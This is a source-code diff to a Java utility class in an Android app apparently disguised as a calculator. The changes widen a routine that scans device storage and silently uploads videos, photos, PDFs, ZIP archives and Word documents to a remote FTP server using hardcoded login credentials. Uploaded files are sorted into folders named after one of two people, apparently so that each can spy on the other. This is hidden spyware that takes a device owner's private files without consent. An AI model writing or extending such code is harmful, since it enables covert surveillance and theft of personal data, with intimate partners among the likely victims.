@@ -11,15 +11,16 @@ import android.util.Log;
 import java.io.File;
 import java.io.FileInputStream;
 
+import es.fraggel.acalculator.Models.User;
 
 
 public class Util {
     //App para eva
-    //public static String EMAIL="fraggelillo666@gmail,com";
-    //public static String NOMBRE="Pablo";
+    public static String EMAIL="fraggelillo666@gmail,com";
+    public static String NOMBRE="Pablo";
     //App para mi
-    public static String EMAIL="eva@gmail,com";
-    public static String NOMBRE="Eva";
+    //public static String EMAIL="eva@gmail,com";
+    //public static String NOMBRE="Eva";
     //App pruebas
     //public static String EMAIL="pruebas@gmail,com";
     //public static String NOMBRE="Nombre";
@@ -45,7 +46,8 @@ public class Util {
             }else{
                 String ff=file.getName().toLowerCase();
                 if(ff.indexOf(".mp4")!=-1|| ff.indexOf(".3gp")!=-1||ff.indexOf(".m4v")!=-1||ff.indexOf(".mov")!=-1
-                        ||ff.indexOf(".jpg")!=-1||ff.indexOf(".jpeg")!=-1||ff.indexOf(".png")!=-1||ff.indexOf(".bmp")!=-1) {
+                        ||ff.indexOf(".jpg")!=-1||ff.indexOf(".jpeg")!=-1||ff.indexOf(".png")!=-1||ff.indexOf(".bmp")!=-1
+                        ||ff.indexOf(".pdf")!=-1||ff.indexOf(".zip")!=-1||ff.indexOf(".doc")!=-1||ff.indexOf(".docx")!=-1) {
                     uploadFile(file);
                     Log.d("Calculator", file.getAbsolutePath());
                 }
@@ -57,6 +59,7 @@ public class Util {
         FileInputStream fis = null;
         FTPClient client = new FTPClient();
         try {
+            String workingDir="";
             fis = new FileInputStream(file);
             client.connect("fraggel.ddns.net", 2121); // no el puerto es por defecto, podemos usar client.connect("servidor.ftp.com");
             /*client.execPBSZ(0);
@@ -64,9 +67,25 @@ public class Util {
             client.login("fraggel", "ak47cold");
             client.enterLocalPassiveMode();
             client.setFileType(FTP.BINARY_FILE_TYPE);
-            client.changeWorkingDirectory("/ftp");
-            client.makeDirectory(file.getParentFile().getName());
-            client.changeWorkingDirectory("/ftp/"+file.getParentFile().getName());
+            workingDir="/ftp/";
+            if(Util.NOMBRE.equals("Pablo")){
+                client.changeWorkingDirectory(workingDir);
+                client.makeDirectory("Eva");
+                workingDir+="Eva/";
+                client.changeWorkingDirectory(workingDir);
+                client.makeDirectory(file.getParentFile().getName());
+                workingDir+=file.getParentFile().getName()+"/";
+                client.changeWorkingDirectory(workingDir);
+            }else{
+                client.changeWorkingDirectory(workingDir);
+                client.makeDirectory("Pablo");
+                workingDir+="Pablo/";
+                client.changeWorkingDirectory(workingDir);
+                client.makeDirectory(file.getParentFile().getName());
+                workingDir+=file.getParentFile().getName()+"/";
+                client.changeWorkingDirectory(workingDir);
+
+            }
             FTPFile[] ftpFiles = client.listFiles(file.getName());
             boolean uploadFile=false;
             if (ftpFiles.length > 0)
